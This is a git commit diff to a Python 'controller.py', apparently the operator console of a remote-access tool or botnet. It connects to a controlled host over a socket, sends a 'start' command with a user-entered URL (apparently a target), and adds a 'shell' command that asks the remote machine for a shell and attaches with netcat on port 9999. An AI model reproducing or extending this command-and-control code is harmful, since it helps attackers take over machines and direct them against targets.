94624b80c95625cc5d00bb4b9e627a8407fced70
Anikin Luke Abales <47096239+abalesluke@users.noreply.github.com>
2021-06-26 04:52:59 +0800

    Update controller.py

--- controller.py
+++ controller.py
@@ -1,7 +1,7 @@
-import socket, readline, os
+import socket, readline, os, subprocess
 
 ip = '10.9.1.23'
-port = 6664
+port = 6667
 
 def connection():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,14 +13,21 @@ def connection():
 		if cmd == 'gg':
 			s.send('gg'.encode())
 			print(s.recv(1024).decode())
-		elif cmd == 'tar':
+		elif cmd == 'start':
+			s.send(cmd.encode())
 			ui = input('enter url: ')
-			s.send('tar'.encode())
 			s.send(ui.encode())
 		elif cmd == 'clear':
 			os.system('clear')
+		elif cmd == 'shell':
+			s.send('shell'.encode())
+			print(s.recv(1024).decode())
+			os.system(f'nc {ip} 9999')
+		elif cmd == 'exit':
+			exit(0)
 		else:
 			s.send(cmd.encode())
 			print(s.recv(1024).decode())
+
 
 connection()
